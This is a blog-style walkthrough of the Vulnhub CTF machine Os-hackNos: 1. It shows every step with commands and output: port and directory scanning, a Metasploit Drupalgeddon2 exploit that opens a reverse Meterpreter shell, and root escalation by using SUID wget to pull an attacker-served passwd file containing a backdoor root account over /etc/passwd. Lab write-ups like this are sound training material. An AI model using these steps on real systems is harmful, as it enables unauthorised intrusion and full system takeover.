---
layout: post
title: Os-hackNos: 1 Writeup
date: 2019-12-01
author: n0khodsia
---

<h1 align="center">
  <br>
  <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/" target="_blank">
    Vulnhub's Os-hackNos: 1
  </a>
</h1>

<h4 align="center">
  CTF By <a href="https://in.linkedin.com/in/rahulgehlaut" target="_blank">Rahul Gehlaut</a>
<br>
  Walkthrough By <a href="https://n0khodsia.github.io/" target="_blank">n0khodsia</a>
</h4>

***


## LAUNCH
For this CTF i'll use Kali Linux VM on VMWare, and Os-hackNos on VirtualBox (It wont work on VMWare).  
First we use `netdiscover` to find out the machine's IP:
```bash
 Currently scanning: 192.168.19.0/16   |   Screen View: Unique Hosts                   
                                                                                       
 Captured ARP Req/Rep packets    Total size: 180                       
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.103   08:00:27:f9:4e:c0      1      60  PCS Systemtechnik GmbH              
```

Then we match the hostname `ctf` to the machine's IP:
```bash
root@kali:~# nano /etc/hosts
27.0.0.1       localhost
127.0.1.1       kali
192.168.1.103   ctf
```

## NMAP
Let's scan the target:

```bash
root@kali:~# nmap -sV -p- ctf
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-01 07:47 EST
Nmap scan report for ctf (192.168.1.103)
Host is up (0.00018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 08:00:27:F9:4E:C0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As we can see, we have 2 different ports: SSH(22) & HTTP(80).

## HTTP
Opening firefox and navigating to `http://ctf:80` just gives us the default post-installation page of **Apache**.
Trying to run `dirb` on the server, gives us the following results:
```bash
root@kali:~# dirb http://ctf:80

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Dec  1 07:49:28 2019
URL_BASE: http://ctf:80/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://ctf:80/ ----
==> DIRECTORY: http://ctf:80/drupal/                                                   
+ http://ctf:80/index.html (CODE:200|SIZE:11321)  
```

Looks like the server hosts a version of [Drupal CMS](https://www.drupal.org/) on `http://ctf/drupal`.
The first thing that comes to my mind is trying **Drupalgeddon1/2/3** exploits.

Let's launch `Metasploit` and try to use those exploits:
```bash
msf5 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
```

We'll try the module `drupal_drupalgeddon2`, and view it's settings:
```bash
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > show options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)

```

We'll set the RHOST to ctf, and TARGETUIT to /drupal.
Followed by RUN to launch the exploit:
```bash
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS ctf
RHOSTS => ctf
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /drupal
TARGETURI => /drupal
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.1.104:4444
[*] Sending stage (38247 bytes) to 192.168.1.103
[*] Meterpreter session 1 opened (192.168.1.104:4444 -> 192.168.1.103:54218) at 2019-12-01 07:55:14 -0500
```
Piece of cake, we now have RCE on the machine via the user `www-data`.

##Privilege Escalation

On meterpreter, we'll type `shell` to drop into the machine's shell:
```bash
meterpreter > shell
Process 2404 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

To be able to use `su` and various other features, we need to upgrade the shell using the python module `pty`:
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@hackNos:/var/www/html/drupal$
```

We can already find the user flag within `/home/james`:
```bash
www-data@hackNos:/var/www/html/drupal$ ls /home
ls /home
james
www-data@hackNos:/var/www/html/drupal$ ls /home/james
ls /home/james
user.txt
www-data@hackNos:/var/www/html/drupal$ cat /home/james/user.txt
cat /home/james/user.txt
   _                                  
  | |                                 
 / __) ______  _   _  ___   ___  _ __
 \__ \|______|| | | |/ __| / _ \| '__|
 (   /        | |_| |\__ \|  __/| |   
  |_|          \__,_||___/ \___||_|   
                                      
                                      

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

```

Let's check which binaries have root SUID, using `find / -perm /4000 2>/dev/null`:
```bash
www-data@hackNos:/var/www/html/drupal$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/wget
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/bin/ping6
/bin/umount
/bin/ntfs-3g
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
```

The list above shows us binaries with root SUID, meaning that even when a low-privileged user executes them,
they do it with root privileges.

The first thing that catches my eye on that list is `wget`.  
`wget` can be used to download files over HTTP and save them locally.  
Usually, `wget` itself isn't too-dangerous. However, if we're allowed to use `wget` as root,
we can override **any** file on the system, including `/etc/passwd` file!

First, let's create a blowfish cipher password using `openssl`:
```bash
root@kali:~# openssl passwd -1 -salt 123 mypass
$1$123$vsQKzM4VDo/EkpS99uCM70
```

This creates a blowfish cipher password `mypass`, with *1* rotation, using the salt *123*.

Next, we copy our Kali's passwd file and add our new user & password to it:
```bash
root@kali:~# cp /etc/passwd .
root@kali:~# echo 'n0khodsia:$1$123$vsQKzM4VDo/EkpS99uCM70:0:0:root:/root:/bin/bash' >> passwd
```

This adds the user `n0khodsia` with our previously made blowfish cipher password and root privileges to our copied `passwd` file.
Now all we need to do is replace this file with the original one on the target machine, and login with our own credentials.  

Let's setup an HTTP server on our Kali:
```bash
root@kali:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now, on the target host let's download the custom `passwd` file and override it to `/etc/passwd`:
```bash
www-data@hackNos:/var/www/html/drupal$  wget http://192.168.1.104/passwd -O /etc/passwd
--2019-12-01 18:42:14--  http://192.168.1.104/passwd
Connecting to 192.168.1.104:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3230 (3.2K) [application/octet-stream]
Saving to: '/etc/passwd'

     0K ...                                                   100%  372M=0s

2019-12-01 18:42:14 (372 MB/s) - '/etc/passwd' saved [3230/3230]
```

Replacing `/etc/passwd` is possible because `wget` runs as ROOT.

We can now login to our root user `n0khodsia` with the password `mypass`:
```shell
www-data@hackNos:/var/www/html/drupal$ su n0khodsia
su n0khodsia
Password: mypass

root@hackNos:/var/www/html/drupal# id
id
uid=0(root) gid=0(root) groups=0(root)
```

And root root flag:
```bash
root@hackNos:/var/www/html/drupal# ls /root
ls /root
root.txt
root@hackNos:/var/www/html/drupal# cat /root/root.txt    
cat /root/root.txt
    _  _                              _   
  _| || |_                           | |  
 |_  __  _|______  _ __  ___    ___  | |_
  _| || |_|______|| '__|/ _ \  / _ \ | __|
 |_  __  _|       | |  | (_) || (_) || |_
   |_||_|         |_|   \___/  \___/  \__|
                                          
                                          

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Linkedin : https://www.linkedin.com/in/rahulgehlaut/

Blog : www.hackNos.com
root@hackNos:/var/www/html/drupal#
```



***
<p align="center">Written by n0khodsia</p>
